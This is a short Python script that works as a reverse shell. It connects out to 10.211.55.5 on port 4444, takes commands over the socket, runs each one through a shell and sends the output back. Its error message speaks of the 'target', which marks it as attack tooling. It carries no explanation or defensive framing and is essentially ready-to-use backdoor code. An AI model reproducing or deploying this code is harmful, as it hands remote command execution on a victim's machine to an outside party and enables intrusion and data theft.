import subprocess, sys, socket


def executeCmd(cmd):
    cmd = subprocess.check_output(cmd,shell=True)
    return cmd


def openRecv(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((str(ip),port))
    while True:
        cmdIn = s.recv(1024)
        cmdIn = cmdIn.decode()
        try:
            cmdOut = executeCmd(cmdIn)
            s.send(str(cmdOut).encode('utf-8'))
        except subprocess.CalledProcessError:
            s.send(b'Subprocess Error, shell command not accepted by target')


try:
    recv = openRecv('10.211.55.5',4444)
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()
